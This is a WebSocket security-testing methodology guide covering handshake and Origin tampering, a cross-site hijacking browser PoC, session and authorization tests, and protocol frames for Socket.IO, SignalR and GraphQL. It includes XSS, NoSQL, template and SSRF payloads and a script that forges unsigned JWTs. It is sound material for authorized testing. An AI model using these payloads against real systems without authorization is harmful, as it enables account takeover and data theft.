# WebSocket

## Discovery

* **Downloaded JavaScript, source maps, or application sources (Linux Bash / Windows PowerShell):** with ripgrep (`rg`) installed, these commands work unchanged in both shells. Replace the quoted directory with a Linux or Windows path.
  * ```
      rg -n -i 'new\s+WebSocket|wss?://|socket\.io|sockjs|signalr|graphql-ws|subscriptions-transport-ws' '<source-directory>'
      rg -n -i 'connection_init|subscribe|joinRoom|access_token|Sec-WebSocket-Protocol' '<source-directory>'
    ```
* **Protocol indicators:** `/socket.io/`, `/sockjs/`, `/negotiate`, and GraphQL subprotocols identify application framing or polling fallbacks; see [Protocol-Specific Tests](websocket.md#protocol-specific-tests).
* **HTTP/1.1:** a successful Upgrade normally returns `101`. WebSockets over HTTP/2 use extended CONNECT and a successful 2xx response instead; the HTTP/1.1 probes below do not test that path.

## Handshake Testing

### Header Validation

* **Change one header in the baseline at a time:** replace the header value or remove the header entirely. Version `13` is the current protocol version; the key must decode to 16 bytes. A `426` can advertise supported versions. Header names are case-insensitive, and `Connection` can legitimately contain multiple comma-separated tokens.
  * ```
      Upgrade: invalid
      Connection: close
      Connection: keep-alive, Upgrade
      Sec-WebSocket-Key: invalid-base64
      Sec-WebSocket-Key: YQ==
      Sec-WebSocket-Version: 12
      Sec-WebSocket-Version: 999
      Host: <alternate-vhost>
      Origin: https://<untrusted-origin>
      Origin: null
    ```
* **Duplicate-header parsing:** replace the single header with each pair below, then reverse the order. Compare the edge response, selected backend, and whether the same authentication/origin policy applies; acceptance alone is not an exploit.
  * ```http
      Origin: https://<target-host>
      Origin: https://<untrusted-origin>
    ```
  * ```http
      Sec-WebSocket-Version: 13
      Sec-WebSocket-Version: 12
    ```
  * ```http
      Host: <target-host>
      Host: <alternate-vhost>
    ```
* **Malformed syntax:** add whitespace before the colon (`Origin : ...`) or leave the header value empty in the HTTP/1.1 handshake. Tool/proxy rewriting can normalize malformed headers. Changing `Host` does not change TLS SNI. [curl alternative](websocket.md#cli-handshake).

### Origin Validation

* **Origin variants:** repeat the working handshake with each value and with the header omitted. Use hostnames matching the target's actual trust boundary.
  * ```
      https://<untrusted-origin>
      https://<target-host>.<tester-domain>
      https://<target-host>-suffix.<tester-domain>
      http://<target-host>
      https://<target-host>:4443
      null
    ```
* Origin is not authentication: non-browser clients can choose any value. Missing-Origin acceptance can be legitimate for native clients; cookie-authenticated browser connections require the browser PoC below. HTTP CORS response headers do not govern WebSocket origin enforcement.

### Cross-Site WebSocket Hijacking

* Browser `WebSocket` cannot set arbitrary `Authorization`, `Cookie`, or `Host` headers. A forged Origin in a proxy/CLI request is not proof of browser exploitability; the PoC must receive protected data or perform an action using credentials the browser supplies automatically.
* **Browser PoC:** serve this page from a different origin and open it in a browser signed into the target. Replace the URL and read/subscription message; include the captured subprotocol as the constructor's second argument if required. The browser supplies `Origin` and eligible cookies automatically. Results stay on the page.
  * ```html
      <!doctype html>
      <meta charset="utf-8">
      <title>WebSocket Origin Test</title>
      <pre id="output"></pre>
      <script>
      const output = document.getElementById('output');
      const log = value => { output.textContent += value + '\n'; };
      const socket = new WebSocket('wss://<target-host>/<ws-path>');
      socket.addEventListener('open', () => {
      	log('Connected');
      	socket.send(JSON.stringify({
      		action: 'subscribe', channel: 'notifications', userId: '<user-a-id>'
      	}));
      });
      socket.addEventListener('message', event => log(event.data));
      socket.addEventListener('error', () => log('Connection error'));
      socket.addEventListener('close', event => log(`Closed: ${event.code} ${event.reason}`));
      </script>
    ```
* Confirm authenticated data or an authenticated action, not merely `open`. `SameSite`, third-party-cookie policy, and cross-origin versus cross-site differences affect cookie delivery. A token manually pasted into this PoC does not demonstrate ambient-cookie hijacking.

## Authentication and Session Lifecycle

### Missing, Invalid, and Mixed Credentials

* **No authentication:** remove cookies, authorization headers, and query tokens from the handshake; omit the message-level authentication frame too. Attempt the protected operation before authentication. Handshake changes apply to a new connection, not an already-authenticated socket. Check protected data/actions, not just connection acceptance. [CLI alternatives](websocket.md#cli-authentication-variants).
* **Credential variants:** replace the handshake or auth-message token with an expired, revoked, malformed, or user B token. Remove each authentication source independently, then all sources together, including URL/subprotocol credentials. User B authenticating as B is expected; receiving A's data is not.
* **Conflicting identities:** combine A's cookie with B's bearer token, then reverse them. Also authenticate as A in the handshake but supply B's `userId` or token in the first message. Check the effective identity through a private subscription or account-specific response.
* **Message-level authentication:** omit the first frame, remove/replace its `token`, or send the subscription before it. Keep the target's actual action names and fields; the following is a template for an authenticate-then-subscribe flow.
  * ```json
      {"action":"authenticate","token":"<user-a-token>"}
    ```
  * ```json
      {"action":"subscribe","channel":"notifications","userId":"<user-a-id>"}
    ```
* **JWT validation:** replace the token at its actual transport location. Change `sub`, role, tenant, or `exp` without re-signing; separately try an unsigned form. Acceptance must be checked with a protected operation.
  * ```javascript
      const encode = value => Buffer.from(JSON.stringify(value)).toString('base64url');
      const token = '<captured-jwt>';
      const parts = token.split('.');
      const claims = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
      claims.sub = '<user-b-id>';
      console.log(`${parts[0]}.${encode(claims)}.${parts[2]}`);
      console.log(`${encode({ alg: 'none', typ: 'JWT' })}.${encode(claims)}.`);
    ```

### Logout, Expiration, Reset, and Revocation

* **Existing connection versus new connection:** open socket A and subscribe; invalidate A's session through logout, password reset, admin revocation, or expiry. On the still-open socket, replay a protected read and a write. In parallel, reconnect using the old credential. Check both newly requested operations and ongoing private push messages; a socket can remain open while correctly denying operations.
  * ```json
      {"action":"getProfile","userId":"<user-a-id>"}
    ```
  * ```json
      {"action":"updatePreference","userId":"<user-a-id>","key":"wsProbe","value":"after-revocation"}
    ```
* **Role/tenant changes:** remove a permission or room membership while the socket remains open, then repeat the subscription and action. Check delivery on existing subscriptions as well as newly created ones.
* **Fixation and replay:** capture the pre-login session identifier; log in and compare the resulting credential. From a separate client, try the old identifier against a protected operation. Reconnect with a previously valid token after revocation. An unchanged identifier alone is not proof of takeover; the old session must gain or retain protected access.
* **Reauthentication:** send the captured auth message twice, switch from A to B on one connection, and then access A's previous subscriptions. Verify old account subscriptions are removed or reauthorized rather than inherited by B.

## Authorization

### Horizontal Access and Tenant Isolation

* **Cross-account access:** on A's authenticated connection, replace A's user, room, message, or tenant identifier with B's. Change one field at a time, including identifiers in URLs, init payloads, arrays, nested objects, and subscription filters. Keep A's credentials unchanged.
  * ```json
      {"action":"subscribe","channel":"notifications","userId":"<user-b-id>"}
    ```
  * ```json
      {"action":"joinRoom","roomId":"<user-b-private-room>"}
    ```
  * ```json
      {"action":"getMessage","messageId":"<user-b-message-id>"}
    ```
  * ```json
      {"action":"updatePreference","userId":"<user-b-id>","key":"wsProbe","value":"cross-account"}
    ```
  * ```json
      {"action":"subscribe","tenantId":"<tenant-b-id>","filter":{"ownerId":"<user-b-id>"}}
    ```
* Check the actual returned data, persisted change, and recipient-side event. A successful acknowledgement with no access may be harmless; a rejected acknowledgement followed by private push data is still an access-control failure.

### Roles, Internal Events, and Sender Spoofing

* **Replay captured privileged operations as a normal user:** use actual event names from an administrator/moderator session; guessed unsupported actions do not establish coverage.
  * ```json
      {"action":"subscribe","channel":"<admin-channel>"}
    ```
  * ```json
      {"action":"<moderator-action>","roomId":"<test-room-id>","messageId":"<test-message-id>"}
    ```
  * ```json
      {"action":"sendMessage","roomId":"<test-room-id>","senderId":"<user-b-id>","role":"admin","text":"ws-sender-probe"}
    ```
* Repeat direct actions without first joining/subscribing; test wildcard room/filter values only if the application supports them. Client-side hidden controls and channel-name secrecy are not server authorization.

## Message Manipulation

### Fields, Types, and Duplicate Keys

* **Field mutations:** remove required fields; add server-managed fields such as `ownerId`, `role`, or `isAdmin`; replace numeric IDs with strings, floats, negative/large numbers, empty strings, `null`, Boolean values, arrays, and objects. Apply each mutation separately to an accepted message and compare the response and persisted state.
  * ```json
      {"action":"getMessage","messageId":-1}
    ```
  * ```json
      {"action":"getMessage","messageId":9007199254740993}
    ```
  * ```json
      {"action":"getMessage","messageId":1.5}
    ```
  * ```json
      {"action":"getMessage","messageId":null}
    ```
  * ```json
      {"action":"getMessage","messageId":["<user-a-message-id>","<user-b-message-id>"]}
    ```
  * ```json
      {"action":"getMessage","messageId":{"id":"<user-b-message-id>"}}
    ```
  * ```json
      {"action":"updateProfile","displayName":"ws-probe","role":"admin","isAdmin":true}
    ```
* **Duplicate keys:** add a second occurrence of the same key with B's identifier, then reverse the order. Preserve the raw JSON text; parsing and reserializing usually removes duplicates. Compare gateway validation with backend parsing.
  * ```
      {"action":"getMessage","messageId":"<user-a-message-id>","messageId":"<user-b-message-id>"}
      {"action":"getMessage","messageId":"<user-b-message-id>","messageId":"<user-a-message-id>"}
    ```
* **Malformed JSON and unexpected top-level types:** send each line separately, then resend the valid baseline to check whether the connection still operates.
  * ```
      {"action":"getMessage",
      []
      null
      true
      "ws-probe"
    ```

### Injection and Rendering

* **Rendered message fields:** test both the sender's view and another user's view, including message history and administrative consoles. Use the actual field rendered by the client.
  * ```json
      {"action":"sendMessage","roomId":"<test-room-id>","text":"<img src=x onerror=alert('ws-probe')>"}
    ```
* **Backend query/template fields:** substitute one marker at a time into an accepted search/message request. Compare baseline, errors, and output; an error or echoed input alone does not confirm injection.
  * ```json
      {"action":"search","query":"ws-probe'"}
    ```
  * ```json
      {"action":"search","query":{"$ne":null}}
    ```
  * ```json
      {"action":"renderPreview","text":"{{7*7}}"}
    ```
* **URL-fetch/import functions:** replace a real URL parameter with a unique URL on your callback endpoint. Distinguish a server-side request from browser-side preview loading; record which component performed the request.
  * ```json
      {"action":"previewUrl","url":"https://<callback-host>/ws-probe-001"}
    ```

### Replay, Ordering, and Business Logic

* **Duplicate state change:** replay the exact accepted frame twice, including its request ID; then change only the request ID. Compare state/event counts with the application's idempotency contract. A request ID can be only a correlation field, not an idempotency key.
  * ```json
      {"action":"<state-changing-action>","requestId":"ws-probe-001","objectId":"<test-object-id>"}
    ```
* **State ordering:** send an action before authentication, before joining the required room, after unsubscribe, and after the object is closed or membership revoked. With two authenticated connections, send the same single-use operation once from each and check whether it commits twice.
* **Transport parity:** replay equivalent actions through HTTP/polling and WebSocket paths with the same identity and object. Compare authorization and input validation, not just status codes.

## Protocol-Specific Tests

* Match the captured protocol and version before using raw frames; a successful WebSocket upgrade is not completion of the application handshake.

### Socket.IO and Engine.IO

* **Event/namespace mutations:** replace the room/object ID in a `42...` event with B's ID; separately replace its event name or namespace with an existing privileged one. Retain the packet envelope. An initialized connection does not require another `40` packet; a fresh connection does. A fresh polling-to-WebSocket upgrade requires valid negotiation state, not an old `sid`. [Direct CLI connection](websocket.md#cli-socketio).
* **Default namespace:** after the server's `0{...}` Engine.IO open packet, send the connect packet below. Replace its authentication object with the captured one, or send just `40` when the namespace uses no auth payload. Wait for `40{...}` before sending the event.
  * ```
      40{"token":"<user-a-token>"}
    ```
  * ```
      42["joinRoom",{"roomId":"<user-b-private-room>"}]
    ```
* **Privileged namespace:** connect as a low-privileged user; after successful namespace acknowledgement, replay an actual privileged event.
  * ```
      40/admin,{"token":"<user-a-token>"}
    ```
  * ```
      42/admin,["<admin-event>",{"objectId":"<test-object-id>"}]
    ```
* Reply to the server's Engine.IO text `2` with text `3`; these are not WebSocket ping/pong control frames. Compare authorization for the default and custom namespaces and for polling versus WebSocket. `EIO=3` has different handshake/heartbeat behavior; use the matching client/version instead of changing only the number.

### SockJS

* **Inner-payload mutations:** replace the room/user ID or action inside the JSON-encoded application string; retain the outer string array and escaped quotes. Compare the framed WebSocket and XHR transport authorization. `/info` identifies transport capabilities, not authorization. [CLI discovery and connection](websocket.md#cli-sockjs).
* **SockJS-framed transport:** wait for `o`, then send an array of JSON-encoded application-message strings. Server messages use `a[...]`, heartbeats use `h`, and closures use `c[...]`.
  * ```json
      ["{\"action\":\"subscribe\",\"roomId\":\"<user-b-private-room>\"}"]
    ```
* **Raw endpoint, if exposed:** `<sockjs-prefix>/websocket` has no SockJS wrapping; send the underlying application payload directly. Compare origin and authorization policy with the framed endpoint and captured XHR polling/send requests. Reusing the same SockJS URL session ID on two WebSocket connections is not itself session hijacking.

### ASP.NET Core SignalR

* **Hub-method mutations:** in a type `1` invocation, replace `target` with an existing privileged method or replace an object ID in `arguments` with B's ID. Preserve the trailing record-separator byte (`0x1e`) and use a fresh `invocationId`. Check the matching type `3` completion and actual application state. On an initialized connection, do not resend the hub handshake.
* **Negotiation credentials:** remove or replace the cookie/token in `/negotiate`, then test WebSocket authentication independently. For negotiation version 1, a fresh socket uses the returned `connectionToken` as the URL-encoded `id`, not `connectionId`. Preserve any required service redirect/access-token flow. [curl alternative](websocket.md#cli-signalr-negotiation).
* **Optional browser-console handshake:** use a fresh negotiated token for the same identity. Preserve any captured query authentication. This appends the actual `0x1e` byte; typing the characters `\x1e` into wscat would not. Replace the hub method and argument list with a captured invocation.
  * ```javascript
      const hubUrl = new URL('wss://<target-host>/<hub-path>');
      hubUrl.searchParams.set('id', '<connectionToken>');
      const hub = new WebSocket(hubUrl);
      const separator = String.fromCharCode(0x1e);
      let handshakeComplete = false;
      let pending = '';
      hub.addEventListener('open', () => {
      	hub.send(JSON.stringify({ protocol: 'json', version: 1 }) + separator);
      });
      hub.addEventListener('message', event => {
      	pending += event.data;
      	const records = pending.split(separator);
      	pending = records.pop();
      	for (const record of records) {
      		if (!record) continue;
      		const message = JSON.parse(record);
      		console.log(message);
      		if (!handshakeComplete) {
      			if (message.error) { hub.close(); return; }
      			handshakeComplete = true;
      			hub.send(JSON.stringify({
      				type: 1, invocationId: 'ws-probe-1',
      				target: '<captured-hub-method>', arguments: ['<user-b-object-id>']
      			}) + separator);
      		}
      	}
      });
      hub.addEventListener('error', () => console.log('Hub connection error'));
      hub.addEventListener('close', event => console.log('Hub closed', event.code, event.reason));
    ```
* Run in the target-origin browser session for cookie authentication; a browser cannot reproduce the curl bearer header automatically. When the application uses query tokens, set `access_token` through `hubUrl.searchParams` before connecting. Query authentication must be supported by that endpoint.
* Replay captured group-join and privileged hub methods as A using B's identifiers; compare the type `3` completion and actual recipient data. Test removing/replacing negotiation credentials separately from WebSocket credentials. JSON hub ping is `{"type":6}` plus the separator; it is not a WebSocket control ping. Legacy ASP.NET SignalR and MessagePack use different wire formats.

### GraphQL Subscriptions

* **Subscription mutations:** replace user/tenant/room IDs in `payload.variables` with B's values while keeping A's authenticated connection. Use a new operation ID unless testing duplicates. A fresh connection requires initialization and acknowledgement; do not reinitialize an acknowledged connection.
* **Modern protocol:** `graphql-transport-ws` is the subprotocol used by the `graphql-ws` library. Preserve it and the intended identity's handshake cookies/headers. [CLI connection](websocket.md#cli-graphql).
* **Initialize:** match the captured authentication payload; its keys are application-defined. Wait for `connection_ack` before subscribing.
  * ```json
      {"type":"connection_init","payload":{"Authorization":"Bearer <user-a-token>"}}
    ```
* **Cross-account subscription:** replace the operation and schema fields with a working subscription, then change only its user/tenant/room variable. Trigger a new event as B to test delivery to A.
  * ```json
      {"id":"probe-1","type":"subscribe","payload":{"query":"subscription Watch($userId: ID!) { notifications(userId: $userId) { id message } }","variables":{"userId":"<user-b-id>"}}}
    ```
* **Stop:** send `complete`, then trigger another event to distinguish continued delivery from messages already in flight.
  * ```json
      {"id":"probe-1","type":"complete"}
    ```
* **Protocol mutations:** subscribe before acknowledgement (`4401`); send a second `connection_init` (`4429`); reuse an active operation ID (`4409`). Repeat authorization tests after token expiry and role removal. Respond to application-level `ping` with `pong`, preserving any payload; these JSON messages are separate from WebSocket control frames.
* **Legacy protocol:** `subscriptions-transport-ws` negotiates the confusingly named `graphql-ws` subprotocol and uses `start`/`data`/`stop` rather than `subscribe`/`next`/`complete`. Use these replacements with the captured legacy initialization; do not mix the two protocols.
  * ```json
      {"id":"probe-1","type":"start","payload":{"query":"subscription Watch($userId: ID!) { notifications(userId: $userId) { id message } }","variables":{"userId":"<user-b-id>"}}}
    ```
  * ```json
      {"id":"probe-1","type":"stop"}
    ```

## Frames, Limits, and Compression

* Fragmentation, opcode, masking, and compression tests require frame-level control; a message editor may reassemble or normalize frames. The Node probes below expose these controls, with Linux and Windows installation commands.

### Interactive Frame Client

* **Node.js REPL:** install `ws` in a testing directory, then run `node` there. Paste the setup below; wait for `OPEN` and complete any application authentication before sending the separate probes. Each probe uses the same `socket`; reconnect after a test that closes it.
  * ```bash
      npm install ws
      node
    ```
  * **Windows PowerShell:**
    * ```powershell
        npm.cmd install ws
        node
      ```
  * ```javascript
      var WebSocketClient = require('ws');
      var socket = new WebSocketClient('wss://<target-host>/<ws-path>', [], {
      	origin: 'https://<target-host>',
      	headers: { Cookie: 'session=<user-a-session>' },
      	perMessageDeflate: false,
      	handshakeTimeout: 10000
      });
      socket.on('open', () => console.log('OPEN', socket.protocol, socket.extensions));
      socket.on('message', (data, binary) => console.log(binary ? 'BINARY' : 'TEXT', data.toString()));
      socket.on('pong', data => console.log('PONG', data.toString()));
      socket.on('error', error => console.log('ERROR', error.message));
      socket.on('close', (code, reason) => console.log('CLOSE', code, reason.toString()));
      var message = JSON.stringify({ action: 'getMessage', messageId: '<user-a-message-id>' });
    ```
* Replace `[]` with `['<captured-subprotocol>']` if needed. This client connects directly, not through Burp. The `message` variable must contain a working application message; protocol wrappers from the preceding section still apply.

### Fragmentation, Binary, and Control Frames

* **Baseline text:** compare its response with the fragmented and binary forms below.
  * ```javascript
      socket.send(message);
    ```
* **One message in two fragments:** the receiver should validate the reassembled message, not treat each fragment as a separate JSON document. Repeat with a previously rejected authorization/input payload and compare its rejection.
  * ```javascript
      var splitAt = Math.floor(message.length / 2);
      socket.send(message.slice(0, splitAt), { fin: false });
      socket.send(message.slice(splitAt), { fin: true });
    ```
* **Same bytes, binary opcode:** check whether a different parser or handler changes authorization. Binary support itself is not a flaw.
  * ```javascript
      socket.send(Buffer.from(message), { binary: true });
    ```
* **Ping/pong:** verifies transport liveness only, not application authentication.
  * ```javascript
      socket.ping('ws-probe');
    ```
* **Invalid UTF-8 text frame:** a protocol-compliant peer should reject invalid text, commonly with `1007`.
  * ```javascript
      socket.send(Buffer.from([0xc3, 0x28]), { binary: false });
    ```
* **Unmasked client frame:** client-to-server frames must be masked; rejection commonly uses `1002`. Run on a fresh connection after the previous test.
  * ```javascript
      socket.send(message, { mask: false });
    ```

### Message Size and Rate Limits

* **Three adjacent size values:** set `fieldLimit` to the application's documented field limit, then run one candidate at a time on an accepted action/field. This measures ASCII field length, not total WebSocket message size; the JSON wrapper adds bytes.
  * ```javascript
      var fieldLimit = 1024;
      var candidateLength = fieldLimit + 1;
      socket.send(JSON.stringify({ action: 'updateProfile', displayName: 'A'.repeat(candidateLength) }));
    ```
* Repeat with `fieldLimit - 1` and `fieldLimit`. For whole-message limits, measure `Buffer.byteLength(payload, 'utf8')`; also compare multibyte text and fragmented delivery. `1009` commonly indicates an oversized message, but an application may return its own error.
* **Short, fixed burst:** use a known read-only action; compare ten responses with the documented limit/window. Repeat once on a second connection for the same account to check whether the quota is per socket or per identity. Ten accepted requests do not establish that no limit exists.
  * ```javascript
      for (let requestIndex = 0; requestIndex < 10; requestIndex++) {
      	if (socket.readyState !== WebSocketClient.OPEN) break;
      	socket.send(JSON.stringify({
      		action: 'getMessage', messageId: '<user-a-message-id>', requestId: `rate-${requestIndex}`
      	}));
      }
    ```

### Compression and Subprotocol Selection

* **Compression comparison:** reconnect with `perMessageDeflate: true`; inspect `socket.extensions` to confirm negotiation. Replay the same accepted and rejected messages with compression enabled and disabled. Rejection should not depend on compression or fragmentation; compare limits against the decompressed message size.
  * ```javascript
      socket.send(message, { compress: true });
    ```
* Compression support alone is not a vulnerability. A compression side channel additionally requires attacker-controlled content and secrets in a shared compression context plus an observable size signal.
* **Subprotocol policy:** reconnect with the expected protocol, no protocol, an unsupported value, and two supported values in reversed order. Compare `socket.protocol` and authorization on the selected handler. The server must not select a subprotocol the client did not offer.
* **Close interpretation:** `1000` normal closure, `1002` protocol error, `1007` invalid payload, `1008` policy violation, `1009` message too large, and `1011` server error. `1006` is a local indication of abnormal termination, not a close code transmitted by the peer. Neither a disconnect nor a generic `500` alone proves a security vulnerability.

## Alternative CLI Clients

### CLI Connection

* **Shells:** Bash blocks are for Linux; PowerShell blocks are for Windows PowerShell 5.1 or PowerShell 7. Node.js/npm must be installed for `wscat` and the Node examples. Windows examples use `npx.cmd`/`npm.cmd` to avoid PowerShell script-shim execution-policy issues, and `curl.exe` to avoid the Windows PowerShell `curl` alias. Browser JavaScript, Node JavaScript, and message payloads are OS-independent.
* **Interactive client:** `wscat` provides a prompt; paste one captured application message per line. `--proxy` expects an HTTP proxy URL. TLS interception requires the proxy CA to be trusted by Node. Set `NODE_EXTRA_CA_CERTS` in the same shell before launching the client:
  * **Linux Bash:**
    * ```bash
        export NODE_EXTRA_CA_CERTS='/path/to/burp-ca.pem'
      ```
  * **Windows PowerShell:**
    * ```powershell
        $env:NODE_EXTRA_CA_CERTS = 'C:\path\to\burp-ca.pem'
      ```

{% tabs %}
{% tab title="Cookie - Linux" %}
- ```bash
    npx --yes wscat -c 'wss://<target-host>/<ws-path>' \
    	-H 'Cookie: session=<user-a-session>' \
    	-o 'https://<target-host>'
  ```
{% endtab %}

{% tab title="Cookie - Windows" %}
* ```powershell
    npx.cmd --yes wscat -c 'wss://<target-host>/<ws-path>' `
    	-H 'Cookie: session=<user-a-session>' `
    	-o 'https://<target-host>'
  ```
{% endtab %}

{% tab title="Bearer Token - Linux" %}
* ```bash
    npx --yes wscat -c 'wss://<target-host>/<ws-path>' \
    	-H 'Authorization: Bearer <user-a-token>' \
    	-o 'https://<target-host>'
  ```
{% endtab %}

{% tab title="Bearer Token - Windows" %}
* ```powershell
    npx.cmd --yes wscat -c 'wss://<target-host>/<ws-path>' `
    	-H 'Authorization: Bearer <user-a-token>' `
    	-o 'https://<target-host>'
  ```
{% endtab %}

{% tab title="Burp and Subprotocol - Linux" %}
* ```bash
    npx --yes wscat --proxy http://127.0.0.1:8080 \
    	-c 'wss://<target-host>/<ws-path>' \
    	-H 'Cookie: session=<user-a-session>' \
    	-o 'https://<target-host>' -s '<captured-subprotocol>'
  ```
{% endtab %}

{% tab title="Burp and Subprotocol - Windows" %}
* ```powershell
    npx.cmd --yes wscat --proxy http://127.0.0.1:8080 `
    	-c 'wss://<target-host>/<ws-path>' `
    	-H 'Cookie: session=<user-a-session>' `
    	-o 'https://<target-host>' -s '<captured-subprotocol>'
  ```
{% endtab %}
{% endtabs %}

### CLI Handshake

* **Baseline HTTP/1.1 handshake:** replace the path and authentication with the captured values. This checks the upgrade only; curl here is not an interactive WebSocket client. A timeout after `101` is expected when the upgraded connection stays open.
  * ```bash
      curl --http1.1 --include --no-buffer --max-time 5 \
      	'https://<target-host>/<ws-path>' \
      	-H 'Connection: Upgrade' \
      	-H 'Upgrade: websocket' \
      	-H 'Sec-WebSocket-Version: 13' \
      	-H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' \
      	-H 'Origin: https://<target-host>' \
      	-H 'Cookie: session=<user-a-session>'
    ```
  * **Windows PowerShell:**
    * ```powershell
        curl.exe --http1.1 --include --no-buffer --max-time 5 `
        	'https://<target-host>/<ws-path>' `
        	-H 'Connection: Upgrade' `
        	-H 'Upgrade: websocket' `
        	-H 'Sec-WebSocket-Version: 13' `
        	-H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' `
        	-H 'Origin: https://<target-host>' `
        	-H 'Cookie: session=<user-a-session>'
      ```

### CLI Authentication Variants

* **No authentication:** standalone equivalent of the [credential mutations](websocket.md#missing-invalid-and-mixed-credentials); complete any required non-authentication protocol initialization before testing the operation.
  * ```bash
      npx --yes wscat -c 'wss://<target-host>/<ws-path>' -o 'https://<target-host>'
    ```
  * **Windows PowerShell:**
    * ```powershell
        npx.cmd --yes wscat -c 'wss://<target-host>/<ws-path>' -o 'https://<target-host>'
      ```
* **Conflicting identities:** cookie for A and bearer token for B; then reverse them and check the effective identity through a protected operation.
  * ```bash
      npx --yes wscat -c 'wss://<target-host>/<ws-path>' \
      	-o 'https://<target-host>' \
      	-H 'Cookie: session=<user-a-session>' \
      	-H 'Authorization: Bearer <user-b-token>'
    ```
  * **Windows PowerShell:**
    * ```powershell
        npx.cmd --yes wscat -c 'wss://<target-host>/<ws-path>' `
        	-o 'https://<target-host>' `
        	-H 'Cookie: session=<user-a-session>' `
        	-H 'Authorization: Bearer <user-b-token>'
      ```

### CLI Socket.IO

* **Direct WebSocket transport, Engine.IO 4:** use the captured path and authentication headers. Do not copy an old polling `sid` into a fresh direct connection. Continue with the [namespace and event sequence](websocket.md#socketio-and-engineio).
  * ```bash
      npx --yes wscat -c 'wss://<target-host>/socket.io/?EIO=4&transport=websocket' \
      	-o 'https://<target-host>' -H 'Cookie: session=<user-a-session>'
    ```
  * **Windows PowerShell:**
    * ```powershell
        npx.cmd --yes wscat -c 'wss://<target-host>/socket.io/?EIO=4&transport=websocket' `
        	-o 'https://<target-host>' -H 'Cookie: session=<user-a-session>'
      ```

### CLI SockJS

* **Discovery and connection:** use the application's SockJS prefix, then continue with the [framed payload](websocket.md#sockjs).
  * ```bash
      curl --include 'https://<target-host>/<sockjs-prefix>/info'
      npx --yes wscat -c 'wss://<target-host>/<sockjs-prefix>/000/<unique-session-id>/websocket' \
      	-o 'https://<target-host>' -H 'Cookie: session=<user-a-session>'
    ```
  * **Windows PowerShell:**
    * ```powershell
        curl.exe --include 'https://<target-host>/<sockjs-prefix>/info'
        npx.cmd --yes wscat -c 'wss://<target-host>/<sockjs-prefix>/000/<unique-session-id>/websocket' `
        	-o 'https://<target-host>' -H 'Cookie: session=<user-a-session>'
      ```

### CLI SignalR Negotiation

* **Negotiation:** preserve the application's auth headers/cookies, then use the returned token as described in the [SignalR flow](websocket.md#aspnet-core-signalr).
  * ```bash
      curl --include --request POST \
      	'https://<target-host>/<hub-path>/negotiate?negotiateVersion=1' \
      	-H 'Authorization: Bearer <user-a-token>' --data ''
    ```
  * **Windows PowerShell:** send an explicit zero-length body; this avoids Windows PowerShell 5.1 dropping empty native-command arguments.
    * ```powershell
        curl.exe --include --request POST `
        	'https://<target-host>/<hub-path>/negotiate?negotiateVersion=1' `
        	-H 'Authorization: Bearer <user-a-token>' -H 'Content-Length: 0'
      ```

### CLI GraphQL

* **Modern protocol:** include handshake cookies/headers if the target uses them, then continue with the [initialization and subscription sequence](websocket.md#graphql-subscriptions).
  * ```bash
      npx --yes wscat -c 'wss://<target-host>/<graphql-path>' \
      	-s graphql-transport-ws -o 'https://<target-host>'
    ```
  * **Windows PowerShell:**
    * ```powershell
        npx.cmd --yes wscat -c 'wss://<target-host>/<graphql-path>' `
        	-s graphql-transport-ws -o 'https://<target-host>'
      ```

## References

* [RFC 6455: WebSocket Protocol](https://www.rfc-editor.org/rfc/rfc6455)
* [PortSwigger: WebSocket Testing](https://portswigger.net/web-security/websockets)
* [wscat Options](https://github.com/websockets/wscat)
* [ws Client API](https://github.com/websockets/ws/blob/master/doc/ws.md)
* [Socket.IO Protocol](https://github.com/socketio/socket.io-protocol)
* [SockJS Protocol](https://github.com/sockjs/sockjs-protocol)
* [SignalR Hub Protocol](https://github.com/dotnet/aspnetcore/blob/main/src/SignalR/docs/specs/HubProtocol.md)
* [GraphQL over WebSocket Protocol](https://github.com/enisdenjo/graphql-ws/blob/master/PROTOCOL.md)
